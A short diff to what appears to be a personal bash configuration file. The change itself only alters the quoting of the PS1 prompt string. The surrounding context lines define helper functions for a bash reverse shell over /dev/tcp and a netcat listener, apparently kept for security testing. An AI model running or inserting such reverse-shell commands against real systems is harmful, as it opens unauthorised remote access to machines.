@@ -48,7 +48,7 @@ function shell-connect() { bash -i >&/dev/tcp/"$1"/"$2" 0>&1; }
 function shell-listen() { sudo nc -nvlp "$1"; }
 
 # color
-PS1='\[\033[01;34m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
+PS1="\[\033[01;34m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ "
 
 eval "$(starship init bash)"
 eval "$(pyenv init -)"
